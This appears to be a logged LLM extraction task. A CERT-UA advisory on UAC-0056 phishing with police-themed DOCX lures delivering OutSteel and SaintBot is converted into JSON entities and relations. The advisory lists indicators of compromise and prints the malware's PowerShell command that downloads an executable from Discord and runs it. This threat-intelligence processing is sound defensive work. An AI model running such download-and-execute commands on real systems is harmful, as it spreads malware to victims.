@@ -1,0 +1,296 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p class="ql-align-justify"><strong>Загальна інформація</strong>&nbsp;</p><p class="ql-align-justify">Урядовою командою реагування на комп’ютерні надзвичайні події України CERT-UA від суб’єкту координації отримано інформацію щодо розповсюдження, начебто, від імені Національної поліції України, електронних листів, із вкладеннями у вигляді захищених паролем DOCX-документів, наприклад «Повідомлення про вчинення злочину (Білоус Олексій Сергійович).docx» або «Повідомлення про вчинення злочину.docx».&nbsp;</p><p class="ql-align-justify">Згадані документи містять вбудовані об’єкти, активація яких призведе до створення і запуску на комп’ютері Javascript-файлу, наприклад «GSU207@POLICE.GOV.UA - Повідомлення (2).js». Останній, за допомогою powershell здійснить підключення до сервісу Discord та завантажить і виконає EXE-файл, що призведе до ураження комп’ютера жертви шкідливою програмою OutSteel (дата компіляції: 30.01.2022) .&nbsp;</p><p class="ql-align-justify">Активність асоційовано з діяльністю групи UAC-0056.&nbsp;&nbsp;</p><p class="ql-align-justify"><strong>Індикатори компрометації</strong>&nbsp;</p><p class="ql-align-justify"><em>Файли:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">4d01975268c215fc26ed79ebd17ec22d	Повідомлення про вчинення злочину (Білоус Олексій Сергійович).docx&nbsp;
+12ed130045b2e731bc66c9261c88efaa	GSU207@POLICE.GOV.UA - Повідомлення (2).js&nbsp;
+22c1d43016cb2b8b9e5e5e9895526354	Повідомлення про вчинення злочину .docx&nbsp;
+0e3c3fe6167485807c4d36a904dfcae1	GSU207@POLICE.GOV.UA - Повідомлення (17).js&nbsp;
+259f06fcdb971f606d239b3178110981	putty.exe&nbsp;
+ccc3750d9270d1e8c95649d91f94033b	putty.dmp.exe (OutSteel)&nbsp;
+5fa2c64ed3e9944030b6fd9f3d3d7102	puttyjejfrwu.exe&nbsp;
+57a10dad336f1a6cb206dca7ddd3fcaf	AutoIt.exe (OutSteel)&nbsp;
+ab2a92e0fc5a6f63336e442f34089f16	1406.exe (SaintBot)&nbsp;
+af9a60ea728985f492119ebf713e0716	load4849kd30.exe (SaintBot)&nbsp;
+247165c7d96bf443b6a7360a44b7dcfb	f0d.exe&nbsp;
+cd8915c63f3134425aa7c851f5f1e645	f1d.exe&nbsp;
+</pre><p class="ql-align-justify"><em>Мережеві:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe&nbsp;
+hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938317934026170408/puttyjejfrwu.exe&nbsp;
+hxxp://185.244.41[.]109:8080/upld/&nbsp;
+hxxp://eumr[.]site/load74h74830.exe&nbsp;
+185.244.41[.]109&nbsp;
+eumr[.]site&nbsp;
+mariaparsons10811@gmail[.]com
+</pre><p class="ql-align-justify"><em>Хостові:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">%PUBLIC%\GoogleChromeUpdate.exe&nbsp;
+%USERPROFILE%\Documents\.exe&nbsp;
+%TEMP%\GSU207@POLICE.GOV.UA - Повідомлення (2).js&nbsp;
+%TEMP%\rmm.bat&nbsp;
+%TEMP%\svjhost.exe&nbsp;
+</pre><p class="ql-align-justify"><em>Процеси:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">1	powershell.exe "%USERPROFILE%\Documents\.exe"&nbsp;
+11	powershell.exe "%USERPROFILE%\Documents\.exe"&nbsp;
+3	powershell.exe &lt;IP-адреса&gt;:443&nbsp;
+22	powershell.exe cdn.discordapp[.]com&nbsp;
+1	wscript.exe powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" [NeT.seRvIcepOiNtmanAgER]::sECURITyPROToCOL = [neT.SEcurITypRotOcoLType]::Tls12; Irm -uRI&nbsp; ("hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe") -outfilE&nbsp; "$enV:PuBLICGoogleChromeUpdate.exe"; sTArt-pRoceSs "$eNV:pUBLIcGoogleChromeUpdate.exe"&nbsp;
+1	WINWORD.EXE wscript.exe "%SYSTEMROOT%\System32\WScript.exe" "%TEMP%\GSU207@POLICE.GOV.UA - Повідомлення (2).js"&nbsp;
+</pre><p class="ql-align-justify"><strong>Додаткова інформація</strong>&nbsp;</p><p class="ql-align-justify"><span style="color: rgba(0, 0, 0, 0.847);">Рекомендуємо заблокувати доступ до сервісів в мережі Інтернет, використання яких не є необхідним і/або може створювати додаткові ризики (наприклад, Discord).</span></p><p class="ql-align-justify">Звертаємо увагу на коректність налаштування політик безпеки і засобів захисту комп’ютера, а саме:&nbsp;</p><ul><li class="ql-align-justify">заборонити процесам програм MS Office (зокрема, WINWORD.EXE) запускати потенційно небезпечні програми, в даному випадку – wscript.exe (Sysmon EventID: 1);&nbsp;</li><li class="ql-align-justify">контролювати мережеві з’єднання (Sysmon EventID: 3,22) потенційно небезпечних програм (powershell.exe тощо)&nbsp;</li></ul><p class="ql-align-justify">&nbsp;<strong>Графічні зображення</strong>&nbsp;</p><p></p><p class="ql-align-center">Рис. 1 Приклад електронного листа та шкідливого документу&nbsp;</p><p><br></p>
+
+=== RESPONSE (8.5s, in 3631 / out 2402 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "Національна поліція України",
+      "kind": "government organization",
+      "gloss": "The central government body responsible for law enforcement in Ukraine."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country located in Eastern Europe."
+    },
+    {
+      "name": "UAC-0056",
+      "kind": "threat actor",
+      "gloss": "A cyber threat group known for cyberattacks against Ukrainian organizations and infrastructure."
+    },
+    {
+      "name": "OutSteel",
+      "kind": "malware",
+      "gloss": "A document-stealing malware family used in cyberattacks."
+    },
+    {
+      "name": "SaintBot",
+      "kind": "malware",
+      "gloss": "A modular malware loader family used to deploy additional malicious payloads."
+    },
+    {
+      "name": "Discord",
+      "kind": "software product",
+      "gloss": "A proprietary instant messaging and digital distribution platform."
+    },
+    {
+      "name": "powershell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework by Microsoft consisting of a command-line shell."
+    },
+    {
+      "name": "MS Office",
+      "kind": "software product",
+      "gloss": "A suite of productivity software applications developed by Microsoft."
+    },
+    {
+      "name": "Повідомлення про вчинення злочину (Білоус Олексій Сергійович).docx",
+      "kind": "computer file",
+      "gloss": "A password-protected malicious Word document used as a lure in phishing attacks."
+    },
+    {
+      "name": "Повідомлення про вчинення злочину.docx",
+      "kind": "computer file",
+      "gloss": "A password-protected malicious Word document used as an attack vector."
+    },
+    {
+      "name": "GSU207@POLICE.GOV.UA - Повідомлення (2).js",
+      "kind": "computer file",
+      "gloss": "A malicious JavaScript file extracted from lure documents to download subsequent malware stages."
+    },
+    {
+      "name": "GSU207@POLICE.GOV.UA - Повідомлення (17).js",
+      "kind": "computer file",
+      "gloss": "A malicious JavaScript file used to execute commands and retrieve malware."
+    },
+    {
+      "name": "putty.exe",
+      "kind": "computer file",
+      "gloss": "An executable file name used to mask malicious payloads in cyberattacks."
+    },
+    {
+      "name": "putty.dmp.exe",
+      "kind": "computer file",
+      "gloss": "An executable file containing the OutSteel malware payload."
+    },
+    {
+      "name": "puttyjejfrwu.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable payload hosted on Discord CDN infrastructure."
+    },
+    {
+      "name": "AutoIt.exe",
+      "kind": "computer file",
+      "gloss": "An executable file associated with OutSteel malware execution."
+    },
+    {
+      "name": "1406.exe",
+      "kind": "computer file",
+      "gloss": "An executable file identified as SaintBot malware."
+    },
+    {
+      "name": "load4849kd30.exe",
+      "kind": "computer file",
+      "gloss": "An executable file identified as SaintBot malware."
+    },
+    {
+      "name": "f0d.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable file identified in the attack infrastructure."
+    },
+    {
+      "name": "f1d.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable file identified in the attack infrastructure."
+    },
+    {
+      "name": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A Discord attachment URL used to deliver a malicious executable file."
+    },
+    {
+      "name": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938317934026170408/puttyjejfrwu.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A Discord attachment URL used to distribute malicious executable files."
+    },
+    {
+      "name": "hxxp://185.244.41[.]109:8080/upld/",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL associated with data exfiltration or malware command infrastructure."
+    },
+    {
+      "name": "hxxp://eumr[.]site/load74h74830.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL used to download an executable payload."
+    },
+    {
+      "name": "185.244.41[.]109",
+      "kind": "ip address",
+      "gloss": "An IP address used in command and control or payload distribution infrastructure."
+    },
+    {
+      "name": "eumr[.]site",
+      "kind": "domain name",
+      "gloss": "A malicious domain name hosting executable malware payloads."
+    },
+    {
+      "name": "mariaparsons10811@gmail[.]com",
+      "kind": "email address",
+      "gloss": "An email address identified as an indicator of compromise."
+    }
+  ],
+  "relations": [
+    {
+      "head": "Національна поліція України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Національної поліції України"
+    },
+    {
+      "head": "UAC-0056",
+      "type": "uses",
+      "tail": "OutSteel",
+      "evidence": "ураження комп’ютера жертви шкідливою програмою OutSteel... Активність асоційовано з діяльністю групи UAC-0056"
+    },
+    {
+      "head": "UAC-0056",
+      "type": "uses",
+      "tail": "SaintBot",
+      "evidence": "1406.exe (SaintBot)"
+    },
+    {
+      "head": "Повідомлення про вчинення злочину (Білоус Олексій Сергійович).docx",
+      "type": "delivers",
+      "tail": "GSU207@POLICE.GOV.UA - Повідомлення (2).js",
+      "evidence": "документи містять вбудовані об’єкти, активація яких призведе до створення і запуску... Javascript-файлу"
+    },
+    {
+      "head": "GSU207@POLICE.GOV.UA - Повідомлення (2).js",
+      "type": "uses",
+      "tail": "powershell",
+      "evidence": "Javascript-файлу... Останній, за допомогою powershell здійснить підключення"
+    },
+    {
+      "head": "GSU207@POLICE.GOV.UA - Повідомлення (2).js",
+      "type": "delivers",
+      "tail": "OutSteel",
+      "evidence": "завантажить і виконає EXE-файл, що призведе до ураження комп’ютера жертви шкідливою програмою OutSteel"
+    },
+    {
+      "head": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe",
+      "type": "hosts",
+      "tail": "putty.exe",
+      "evidence": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe"
+    },
+    {
+      "head": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938317934026170408/puttyjejfrwu.exe",
+      "type": "hosts",
+      "tail": "puttyjejfrwu.exe",
+      "evidence": "hxxps://cdn.discordapp[.]com/attachments/932413459872747544/938317934026170408/puttyjejfrwu.exe"
+    },
+    {
+      "head": "eumr[.]site",
+      "type": "hosts",
+      "tail": "hxxp://eumr[.]site/load74h74830.exe",
+      "evidence": "hxxp://eumr[.]site/load74h74830.exe"
+    },
+    {
+      "head": "185.244.41[.]109",
+      "type": "hosts",
+      "tail": "hxxp://185.244.41[.]109:8080/upld/",
+      "evidence": "hxxp://185.244.41[.]109:8080/upld/"
+    }
+  ],
+  "newRelationTypes": []
+}
